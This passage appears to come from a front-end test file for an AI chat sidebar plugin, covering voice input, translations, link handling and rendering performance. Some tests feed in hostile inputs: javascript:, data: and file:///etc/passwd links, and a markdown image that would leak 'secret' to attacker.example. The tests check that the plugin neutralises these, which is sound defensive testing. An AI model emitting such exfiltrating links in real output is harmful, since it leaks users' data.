		reply("[x](javascript:alert(1)) [d](data:text/html,hi) [f](file:///etc/passwd) [m](mailto:a@b.c)");
		expect($$(".assistant_message a").map((a) => a.getAttribute("href"))).toEqual(["mailto:a@b.c"]);
	});
});

describe("voice input", () => {
	test("hidden unless supported; toggles recording and appends text", () => {
		setup();
		expect(screen.queryByRole("button", { name: "Voice input" })).toBeNull();
		fire("onVoiceInputSupport", true);
		const engine = { start: vi.fn(), stop: vi.fn() };
		const rec: any = { engine };
		(window as any).initVoiceRecognitionEngine = () => rec;
		fireEvent.input(input(), { target: { value: "Hello" } });
		fireEvent.click(screen.getByRole("button", { name: "Voice input" }));
		expect(engine.start).toHaveBeenCalled();
		act(() => rec.onStart());
		act(() => rec.onProgress("world"));
		expect(input().value).toBe("Hello world");
		fireEvent.click(screen.getByRole("button", { name: "Stop voice input" }));
		expect(engine.stop).toHaveBeenCalled();
		act(() => rec.onError("network"));
		expect($(".div_error")!.textContent).toBe("Voice input error: network");
	});

	test("unsupported browser shows an error that disappears", () => {
		vi.useFakeTimers();
		setup();
		fire("onVoiceInputSupport", true);
		(window as any).initVoiceRecognitionEngine = () => null;
		fireEvent.click(screen.getByRole("button", { name: "Voice input" }));
		expect(screen.getByRole("alert").textContent).toBe("Voice input is not supported in your browser");
		act(() => { vi.advanceTimersByTime(5000); });
		expect(screen.queryByRole("alert")).toBeNull();
	});
});

describe("translations", () => {
	test("strings go through Asc.plugin.tr and the plugin's translation files", async () => {
		setup();
		const chat = start(plugin, root, localStorage);
		act(() => plugin.init());
		act(() => chat.setTranslations({ "Ask AI anything": "KI etwas fragen", "Send": "Senden" }));
		expect(screen.getAllByRole("textbox").some((t) => t.getAttribute("placeholder") === "KI etwas fragen")).toBe(true);
		expect(screen.getAllByRole("button", { name: "Senden" }).length).toBeGreaterThan(0);
	});

	test("loadTranslations picks the language file from ../translations", async () => {
		const requested: string[] = [];
		const files: Record<string, unknown> = { "../translations/langs.json": ["de-DE", "fr-FR"], "../translations/de-DE.json": { Send: "Senden" } };
		class FakeXHR {
			url = ""; responseText = ""; onload: any; onerror: any;
			open(_m: string, url: string) { this.url = url; }
			send() { requested.push(this.url); this.responseText = JSON.stringify(files[this.url] ?? null); setTimeout(() => this.onload()); }
		}
		const orig = window.XMLHttpRequest;
		(window as any).XMLHttpRequest = FakeXHR;
		try {
			expect(await loadTranslations("en-US")).toBeNull();
			expect(await loadTranslations("de-AT")).toEqual({ Send: "Senden" });
			expect(await loadTranslations("ja-JA")).toBeNull();
			expect(requested).toEqual(["../translations/langs.json", "../translations/de-DE.json", "../translations/langs.json"]);
		} finally {
			window.XMLHttpRequest = orig;
		}
	});
});

describe("review findings", () => {
	test("markdown images are shown as their alt text and never load", () => {
		setup();
		reply("Leak ![secret data](https://attacker.example/p.png?d=secret) here");
		expect($$(".assistant_message img:not(.icon)")).toHaveLength(0);
		expect($(".assistant_message .span_message")!.innerHTML).not.toContain("attacker.example");
		expect($(".assistant_message")!.textContent).toContain("secret data");
	});

	test("web links open without a handle back to the sidebar", () => {
		setup();
		const calls: unknown[][] = [];
		window.open = ((...args: unknown[]) => { calls.push(args); return null; }) as any;
		reply("[web](https://example.com)");
		fireEvent.click($$("a").find((a) => a.textContent === "web")!);
		expect(calls).toEqual([["https://example.com/", "_blank", "noopener"]]);
	});

	test("a full storage still answers onUpdateState", () => {
		setup();
		const setItem = vi.spyOn(localStorage, "setItem").mockImplementation(() => { throw new Error("QuotaExceededError"); });
		const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
		fire("onUpdateState");
		expect(sent.pop()).toEqual(["onUpdateState", undefined]);
		setItem.mockRestore();
		warn.mockRestore();
	});

	test("a stream chunk re-renders only the streaming message, not the history", async () => {
		const { options } = await import("preact");
		setup();
		for (let i = 0; i < 20; i++) {
			submit("question " + i);
			fire("onToolCallStart", { type: "native", id: "t" + i, functionName: "readDocument", humanName: "Read", arguments: "{}" });
			fire("onToolCallEnd", { type: "native", id: "t" + i, functionName: "readDocument", arguments: "{}", result: { message: "ok" } });
			reply("answer " + i);
		}
		submit("last");
		fire("onChatStreamStart");
		fire("onChatStreamChunk", "first ");
		// Message components, not their memo() wrappers (names are minified here).
		const renderedItems = new Set<number>();
		const prev = (options as any).diffed;
		(options as any).diffed = (vnode: any) => {
			const type = vnode.type;
			const isMemoWrapper = typeof type === "function" && /^Memo\(/.test(type.displayName || "");
			if (typeof type === "function" && !isMemoWrapper && vnode.props && vnode.props.item)
				renderedItems.add(vnode.props.item.id);
			prev && prev(vnode);
		};
		try {
			fire("onChatStreamChunk", "chunk");
		} finally {
			(options as any).diffed = prev;
		}
		expect(renderedItems.size).toBe(1);
		expect($$(".assistant_message").pop()!.textContent).toContain("first chunk");
	});
});
